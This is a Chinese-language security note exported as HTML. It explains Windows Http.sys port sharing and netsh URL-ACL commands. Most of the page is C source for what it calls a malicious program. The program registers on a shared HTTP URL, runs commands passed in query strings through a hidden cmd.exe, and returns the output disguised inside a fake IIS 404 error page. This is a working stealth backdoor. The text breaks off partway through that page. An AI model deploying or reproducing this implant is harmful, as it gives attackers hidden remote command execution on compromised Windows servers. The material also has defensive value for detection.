<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>端口复用</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>端口复用</h1><br/>微软在Windows 2003 Server加入了内核驱动程序(Http.sys)<br />用于侦听http流量并根据URL进行处理，允许任意用户进程共享专用于HTTP流量的TCP端口。<br /><br />可以使用Netsh命令来查询和配置HTTP.sys设置和参数，参考资料如下：<br /><br /><a href="https://docs.microsoft.com/en-us/windows/win32/http/netsh-commands-for-http">https://docs.microsoft.com/en-us/windows/win32/http/netsh-commands-for-http</a><br /><br />列出所有URL的DACL，命令如下：<br />netsh http show urlacl<br /><br /><a href="http://+:80/Temporary_Listen_Addresses/">http://+:80/Temporary_Listen_Addresses/</a>允许所有用户访问<br /><br />如果使用了HTTP Server API，程序在运行时会注册url，查看命令如下：<br />netsh http sh ser<br /><br />可以查询到具体哪个程序使用了Http.sys提供的端口复用<br /><br />利用：<br />windwos服务器上开启了IIS或者其他web服务<br /><br />运行恶意程序，使用端口复用隐藏端口信息<br />代码如下：<br /><div class="codebox"><div class="codebox">#include&nbsp;&quot;stdafx.h&quot;<br /><br />#ifndef&nbsp;UNICODE<br />#define&nbsp;UNICODE<br />#endif<br /><br />#ifndef&nbsp;_WIN32_WINNT<br />#define&nbsp;_WIN32_WINNT&nbsp;0x0600<br />#endif<br /><br />#ifndef&nbsp;WIN32_LEAN_AND_MEAN<br />#define&nbsp;WIN32_LEAN_AND_MEAN<br />#endif<br /><br />#include&nbsp;&lt;windows.h&gt;<br />#include&nbsp;&lt;http.h&gt;<br />#include&nbsp;&lt;stdio.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;httpapi.lib&quot;)<br />#pragma&nbsp;comment(lib,&nbsp;&quot;User32.lib&quot;)<br /><br />static&nbsp;unsigned&nbsp;char&nbsp;char_to_hex(unsigned&nbsp;char&nbsp;x)<br />{<br />	return&nbsp;(unsigned&nbsp;char)(x&nbsp;&gt;&nbsp;9&nbsp;?&nbsp;x&nbsp;+&nbsp;55&nbsp;:&nbsp;x&nbsp;+&nbsp;48);<br />}<br /><br />static&nbsp;int&nbsp;is_alpha_number_char(unsigned&nbsp;char&nbsp;c)<br />{<br />	if&nbsp;((c&nbsp;&gt;=&nbsp;&#39;a&#39;&nbsp;&amp;&amp;&nbsp;c&nbsp;&lt;=&nbsp;&#39;z&#39;)&nbsp;||&nbsp;(c&nbsp;&gt;=&nbsp;&#39;A&#39;&nbsp;&amp;&amp;&nbsp;c&nbsp;&lt;=&nbsp;&#39;Z&#39;)&nbsp;||&nbsp;(c&nbsp;&gt;=&nbsp;&#39;0&#39;&nbsp;&amp;&amp;&nbsp;c&nbsp;&lt;=&nbsp;&#39;9&#39;))<br />		return&nbsp;1;<br />	return&nbsp;0;<br />}<br /><br />WCHAR*&nbsp;urldecode(WCHAR*&nbsp;cd)<br />{<br />	WCHAR*&nbsp;decd&nbsp;=&nbsp;new&nbsp;WCHAR[wcslen(cd)+1];<br />	int&nbsp;j,&nbsp;i;<br />	WCHAR&nbsp;p[2];<br />	unsigned&nbsp;int&nbsp;num;<br />	j&nbsp;=&nbsp;0;<br /><br />	for&nbsp;(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;wcslen(cd);&nbsp;i++)<br />	{<br />		memset(p,&nbsp;&#39;/0&#39;,&nbsp;2);<br />		if&nbsp;(cd[i]&nbsp;!=&nbsp;&#39;%&#39;)<br />		{<br />			decd[j++]&nbsp;=&nbsp;cd[i];<br />			continue;<br />		}<br /><br />		p[0]&nbsp;=&nbsp;cd[++i];<br />		p[1]&nbsp;=&nbsp;cd[++i];<br /><br />		p[0]&nbsp;=&nbsp;p[0]&nbsp;-&nbsp;48&nbsp;-&nbsp;((p[0]&nbsp;&gt;=&nbsp;&#39;A&#39;)&nbsp;?&nbsp;7&nbsp;:&nbsp;0)&nbsp;-&nbsp;((p[0]&nbsp;&gt;=&nbsp;&#39;a&#39;)&nbsp;?&nbsp;32&nbsp;:&nbsp;0);<br />		p[1]&nbsp;=&nbsp;p[1]&nbsp;-&nbsp;48&nbsp;-&nbsp;((p[1]&nbsp;&gt;=&nbsp;&#39;A&#39;)&nbsp;?&nbsp;7&nbsp;:&nbsp;0)&nbsp;-&nbsp;((p[1]&nbsp;&gt;=&nbsp;&#39;a&#39;)&nbsp;?&nbsp;32&nbsp;:&nbsp;0);<br />		decd[j++]&nbsp;=&nbsp;(unsigned&nbsp;char)(p[0]&nbsp;*&nbsp;16&nbsp;+&nbsp;p[1]);<br /><br />	}<br />	decd[j]&nbsp;=&nbsp;0;<br /><br />	return&nbsp;decd;<br />}<br /><br />char&nbsp;*ExeCmd(WCHAR&nbsp;*pszCmd)<br />{<br />	SECURITY_ATTRIBUTES&nbsp;sa;<br />	HANDLE&nbsp;hRead,&nbsp;hWrite;<br /><br />	sa.nLength&nbsp;=&nbsp;sizeof(SECURITY_ATTRIBUTES);<br />	sa.lpSecurityDescriptor&nbsp;=&nbsp;NULL;<br />	sa.bInheritHandle&nbsp;=&nbsp;TRUE;<br /><br />	if&nbsp;(!CreatePipe(&amp;hRead,&nbsp;&amp;hWrite,&nbsp;&amp;sa,&nbsp;0))<br />	{<br />		return&nbsp;(&quot;[!]&nbsp;CreatePipe&nbsp;failed.&quot;);<br />	}<br /><br />	STARTUPINFO&nbsp;si;<br />	PROCESS_INFORMATION&nbsp;pi;<br />	si.cb&nbsp;=&nbsp;sizeof(STARTUPINFO);<br />	GetStartupInfo(&amp;si);<br />	si.hStdError&nbsp;=&nbsp;hWrite;<br />	si.hStdOutput&nbsp;=&nbsp;hWrite;<br />	si.wShowWindow&nbsp;=&nbsp;SW_HIDE;<br />	si.dwFlags&nbsp;=&nbsp;STARTF_USESHOWWINDOW&nbsp;|&nbsp;STARTF_USESTDHANDLES;<br /><br />	WCHAR&nbsp;command[MAX_PATH];<br />	wsprintf(command,&nbsp;L&quot;cmd.exe&nbsp;/c&nbsp;%ws&quot;,&nbsp;pszCmd);<br /><br />	if&nbsp;(!CreateProcess(NULL,&nbsp;command,&nbsp;NULL,&nbsp;NULL,&nbsp;TRUE,&nbsp;NULL,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;si,&nbsp;&amp;pi))<br />		return&nbsp;(&quot;[!]&nbsp;CreateProcess&nbsp;failed.&quot;);<br /><br />	CloseHandle(hWrite);<br /><br />	char&nbsp;buffer[4096]&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br /><br />	DWORD&nbsp;bytesRead;<br />	char&nbsp;strText[32768]&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br /><br />	while&nbsp;(true)<br />	{<br />		if&nbsp;(ReadFile(hRead,&nbsp;buffer,&nbsp;4096&nbsp;-&nbsp;1,&nbsp;&amp;bytesRead,&nbsp;NULL)&nbsp;==&nbsp;NULL)<br />			break;<br />		sprintf_s(strText,&nbsp;&quot;%s\r\n%s&quot;,&nbsp;strText,&nbsp;buffer);<br />		memset(buffer,&nbsp;0,&nbsp;sizeof(buffer));<br /><br />	}<br />	//	printf(&quot;%s\n&quot;,&nbsp;strText);<br />	return&nbsp;strText;<br />}<br /><br />char&nbsp;*TextToHtml(char&nbsp;*String1)<br />{<br />	if&nbsp;(strlen(String1)&nbsp;==&nbsp;0)return&nbsp;&quot;ok&quot;;<br />	char&nbsp;*String2&nbsp;=&nbsp;new&nbsp;char[(strlen(String1)&nbsp;-&nbsp;1)&nbsp;*&nbsp;5];<br />	int&nbsp;Flag&nbsp;=&nbsp;0;<br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;strlen(String1);&nbsp;i++)<br />	{<br />		if&nbsp;(String1[i]&nbsp;==&nbsp;&#39;\n&#39;)<br />		{<br />			String2[i&nbsp;+&nbsp;Flag&nbsp;*&nbsp;4]&nbsp;=&nbsp;&#39;&lt;&#39;;<br />			String2[i&nbsp;+&nbsp;1&nbsp;+&nbsp;Flag&nbsp;*&nbsp;4]&nbsp;=&nbsp;&#39;/&#39;;<br />			String2[i&nbsp;+&nbsp;2&nbsp;+&nbsp;Flag&nbsp;*&nbsp;4]&nbsp;=&nbsp;&#39;b&#39;;<br />			String2[i&nbsp;+&nbsp;3&nbsp;+&nbsp;Flag&nbsp;*&nbsp;4]&nbsp;=&nbsp;&#39;r&#39;;<br />			String2[i&nbsp;+&nbsp;4&nbsp;+&nbsp;Flag&nbsp;*&nbsp;4]&nbsp;=&nbsp;&#39;&gt;&#39;;<br />			Flag++;<br />		}<br />		else<br />			String2[i&nbsp;+&nbsp;Flag&nbsp;*&nbsp;4]&nbsp;=&nbsp;String1[i];<br />	}<br />	String2[strlen(String1)&nbsp;+&nbsp;Flag&nbsp;*&nbsp;4]&nbsp;=&nbsp;&#39;\0&#39;;<br />	return&nbsp;String2;<br />}<br /><br />#define&nbsp;INITIALIZE_HTTP_RESPONSE(&nbsp;resp,&nbsp;status,&nbsp;reason&nbsp;)&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;do&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlZeroMemory(&nbsp;(resp),&nbsp;sizeof(*(resp))&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(resp)-&gt;StatusCode&nbsp;=&nbsp;(status);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(resp)-&gt;pReason&nbsp;=&nbsp;(reason);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(resp)-&gt;ReasonLength&nbsp;=&nbsp;(USHORT)&nbsp;strlen(reason);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;while&nbsp;(FALSE)<br /><br />#define&nbsp;ADD_KNOWN_HEADER(Response,&nbsp;HeaderId,&nbsp;RawValue)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;do&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Response).Headers.KnownHeaders[(HeaderId)].pRawValue&nbsp;=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(RawValue);\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Response).Headers.KnownHeaders[(HeaderId)].RawValueLength&nbsp;=&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(USHORT)&nbsp;strlen(RawValue);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;while(FALSE)<br /><br />#define&nbsp;ALLOC_MEM(cb)&nbsp;HeapAlloc(GetProcessHeap(),&nbsp;0,&nbsp;(cb))<br /><br />#define&nbsp;FREE_MEM(ptr)&nbsp;HeapFree(GetProcessHeap(),&nbsp;0,&nbsp;(ptr))<br /><br />//<br />//&nbsp;Prototypes.<br />//<br />DWORD&nbsp;DoReceiveRequests(HANDLE&nbsp;hReqQueue);<br /><br />DWORD<br />SendHttpResponse(<br />	IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hReqQueue,<br />	IN&nbsp;PHTTP_REQUEST&nbsp;pRequest,<br />	IN&nbsp;USHORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StatusCode,<br />	IN&nbsp;PSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pReason,<br />	IN&nbsp;PSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pEntity<br />);<br /><br />DWORD<br />SendHttpPostResponse(<br />	IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hReqQueue,<br />	IN&nbsp;PHTTP_REQUEST&nbsp;pRequest<br />);<br /><br /><br />int&nbsp;__cdecl&nbsp;wmain(<br />	int&nbsp;argc,<br />	wchar_t&nbsp;*&nbsp;argv[]<br />)<br />{<br />	//TextToHtml(ExeCmd(L&quot;start&nbsp;calc&quot;));<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retCode;<br />	HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hReqQueue&nbsp;=&nbsp;NULL;<br />	int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UrlAdded&nbsp;=&nbsp;0;<br />	HTTPAPI_VERSION&nbsp;HttpApiVersion&nbsp;=&nbsp;HTTPAPI_VERSION_1;<br /><br />	if&nbsp;(argc&nbsp;&lt;&nbsp;2)<br />	{<br />		wprintf(L&quot;%ws:&nbsp;&lt;Url1&gt;&nbsp;[Url2]&nbsp;...&nbsp;\nfor&nbsp;example%ws&nbsp;http://+:80/Temporary_Listen_Addresses/&quot;,&nbsp;argv[0],&nbsp;argv[0]);<br />		return&nbsp;-1;<br />	}<br /><br />	//<br />	//&nbsp;Initialize&nbsp;HTTP&nbsp;Server&nbsp;APIs<br />	//<br />	retCode&nbsp;=&nbsp;HttpInitialize(<br />		HttpApiVersion,<br />		HTTP_INITIALIZE_SERVER,&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Flags<br />		NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserved<br />	);<br /><br />	if&nbsp;(retCode&nbsp;!=&nbsp;NO_ERROR)<br />	{<br />		wprintf(L&quot;HttpInitialize&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,&nbsp;retCode);<br />		return&nbsp;retCode;<br />	}<br /><br />	//<br />	//&nbsp;Create&nbsp;a&nbsp;Request&nbsp;Queue&nbsp;Handle<br />	//<br />	retCode&nbsp;=&nbsp;HttpCreateHttpHandle(<br />		&amp;hReqQueue,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Req&nbsp;Queue<br />		0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserved<br />	);<br /><br />	if&nbsp;(retCode&nbsp;!=&nbsp;NO_ERROR)<br />	{<br />		wprintf(L&quot;HttpCreateHttpHandle&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,&nbsp;retCode);<br />		goto&nbsp;CleanUp;<br />	}<br /><br /><br />	//<br />	//&nbsp;监听输入的几个url，使用API:&nbsp;HttpAddUrl<br />	//这几个URL必须写完整，并且以/结尾<br /><br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;1;&nbsp;i&nbsp;&lt;&nbsp;argc;&nbsp;i++)<br />	{<br />		wprintf(L&quot;listening&nbsp;for&nbsp;requests&nbsp;on&nbsp;the&nbsp;following&nbsp;url:&nbsp;%s\n&quot;,&nbsp;argv[i]);<br /><br />		retCode&nbsp;=&nbsp;HttpAddUrl(<br />			hReqQueue,&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Req&nbsp;Queue<br />			argv[i],&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Fully&nbsp;qualified&nbsp;URL<br />			NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserved<br />		);<br /><br />		if&nbsp;(retCode&nbsp;!=&nbsp;NO_ERROR)<br />		{<br />			wprintf(L&quot;HttpAddUrl&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,&nbsp;retCode);<br />			goto&nbsp;CleanUp;<br />		}<br />		else<br />		{<br />			//<br />			//&nbsp;Track&nbsp;the&nbsp;currently&nbsp;added&nbsp;URLs.<br />			//<br />			UrlAdded++;<br />		}<br />	}<br /><br />	DoReceiveRequests(hReqQueue);<br /><br />CleanUp:<br /><br />	//<br />	//&nbsp;Call&nbsp;HttpRemoveUrl&nbsp;for&nbsp;all&nbsp;added&nbsp;URLs.<br />	//<br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;1;&nbsp;i&nbsp;&lt;=&nbsp;UrlAdded;&nbsp;i++)<br />	{<br />		HttpRemoveUrl(<br />			hReqQueue,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Req&nbsp;Queue<br />			argv[i]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Fully&nbsp;qualified&nbsp;URL<br />		);<br />	}<br /><br />	//<br />	//&nbsp;Close&nbsp;the&nbsp;Request&nbsp;Queue&nbsp;handle.<br />	//<br />	if&nbsp;(hReqQueue)<br />	{<br />		CloseHandle(hReqQueue);<br />	}<br /><br />	//&nbsp;<br />	//&nbsp;Call&nbsp;HttpTerminate.<br />	//<br />	HttpTerminate(HTTP_INITIALIZE_SERVER,&nbsp;NULL);<br /><br />	return&nbsp;retCode;<br />}<br /><br />/*******************************************************************++<br /><br />Routine&nbsp;Description:<br />The&nbsp;function&nbsp;to&nbsp;receive&nbsp;a&nbsp;request.&nbsp;This&nbsp;function&nbsp;calls&nbsp;the<br />corresponding&nbsp;function&nbsp;to&nbsp;handle&nbsp;the&nbsp;response.<br /><br />Arguments:<br />hReqQueue&nbsp;-&nbsp;Handle&nbsp;to&nbsp;the&nbsp;request&nbsp;queue<br /><br />Return&nbsp;Value:<br />Success/Failure.<br /><br />--*******************************************************************/<br />DWORD&nbsp;DoReceiveRequests(<br />	IN&nbsp;HANDLE&nbsp;hReqQueue<br />)<br />{<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result;<br />	HTTP_REQUEST_ID&nbsp;&nbsp;&nbsp;&nbsp;requestId;<br />	DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bytesRead;<br />	PHTTP_REQUEST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pRequest;<br />	PCHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pRequestBuffer;<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RequestBufferLength;<br /><br />	//<br />	//&nbsp;Allocate&nbsp;a&nbsp;2&nbsp;KB&nbsp;buffer.&nbsp;This&nbsp;size&nbsp;should&nbsp;work&nbsp;for&nbsp;most&nbsp;<br />	//&nbsp;requests.&nbsp;The&nbsp;buffer&nbsp;size&nbsp;can&nbsp;be&nbsp;increased&nbsp;if&nbsp;required.&nbsp;Space<br />	//&nbsp;is&nbsp;also&nbsp;required&nbsp;for&nbsp;an&nbsp;HTTP_REQUEST&nbsp;structure.<br />	//<br />	RequestBufferLength&nbsp;=&nbsp;sizeof(HTTP_REQUEST)&nbsp;+&nbsp;2048;<br />	pRequestBuffer&nbsp;=&nbsp;(PCHAR)ALLOC_MEM(RequestBufferLength);<br /><br />	if&nbsp;(pRequestBuffer&nbsp;==&nbsp;NULL)<br />	{<br />		return&nbsp;ERROR_NOT_ENOUGH_MEMORY;<br />	}<br /><br />	pRequest&nbsp;=&nbsp;(PHTTP_REQUEST)pRequestBuffer;<br /><br />	//<br />	//&nbsp;Wait&nbsp;for&nbsp;a&nbsp;new&nbsp;request.&nbsp;This&nbsp;is&nbsp;indicated&nbsp;by&nbsp;a&nbsp;NULL&nbsp;<br />	//&nbsp;request&nbsp;ID.<br />	//<br /><br />	HTTP_SET_NULL_ID(&amp;requestId);<br /><br />	for&nbsp;(;;)<br />	{<br />		RtlZeroMemory(pRequest,&nbsp;RequestBufferLength);<br /><br />		result&nbsp;=&nbsp;HttpReceiveHttpRequest(<br />			hReqQueue,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Req&nbsp;Queue<br />			requestId,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Req&nbsp;ID<br />			0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Flags<br />			pRequest,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;HTTP&nbsp;request&nbsp;buffer<br />			RequestBufferLength,//&nbsp;req&nbsp;buffer&nbsp;length<br />			&amp;bytesRead,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;bytes&nbsp;received<br />			NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;LPOVERLAPPED<br />		);<br /><br />		if&nbsp;(NO_ERROR&nbsp;==&nbsp;result)<br />		{<br />			//<br />			//&nbsp;Worked!&nbsp;<br />			//&nbsp;<br />			switch&nbsp;(pRequest-&gt;Verb)<br />			{<br />			case&nbsp;HttpVerbGET:<br />				wprintf(L&quot;[+]&nbsp;Got&nbsp;a&nbsp;GET&nbsp;request&nbsp;for&nbsp;%ws&nbsp;\n&quot;,<br />					pRequest-&gt;CookedUrl.pFullUrl);<br /><br />				if&nbsp;(pRequest-&gt;CookedUrl.QueryStringLength&nbsp;==&nbsp;0)<br />				{<br />					result&nbsp;=&nbsp;SendHttpResponse(<br />						hReqQueue,<br />						pRequest,<br />						404,<br />						&quot;Not&nbsp;Found&quot;,<br />						&quot;&lt;!DOCTYPE&nbsp;html&nbsp;PUBLIC&nbsp;\&quot;-//W3C//DTD&nbsp;XHTML&nbsp;1.0&nbsp;Strict//EN\&quot;&nbsp;\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\&quot;&gt;\r\n&lt;html&nbsp;xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot;&gt;\r\n&lt;head&gt;\r\n&lt;meta&nbsp;http-equiv=\&quot;Content-Type\&quot;&nbsp;content=\&quot;text/html;&nbsp;charset=iso-8859-1\&quot;/&gt;\r\n&lt;title&gt;404&nbsp;-&nbsp;File&nbsp;or&nbsp;directory&nbsp;not&nbsp;found.&lt;/title&gt;\r\n&lt;style&nbsp;type=\&quot;text/css\&quot;&gt;\r\n&lt;!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana,&nbsp;Arial,&nbsp;Helvetica,&nbsp;sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0&nbsp;15px&nbsp;10px&nbsp;15px;}&nbsp;\r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;}\r\nh3{font-size:1.2em;margin:10px&nbsp;0&nbsp;0&nbsp;0;color:#000000;}\r\n#header{width:96%;margin:0&nbsp;0&nbsp;0&nbsp;0;padding:6px&nbsp;2%&nbsp;6px&nbsp;2%;font-family:\&quot;trebuchet&nbsp;MS\&quot;,&nbsp;Verdana,&nbsp;sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0&nbsp;0&nbsp;0&nbsp;2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n--&gt;\r\n&lt;/style&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;div&nbsp;id=\&quot;header\&quot;&gt;&lt;h1&gt;Server&nbsp;Error&lt;/h1&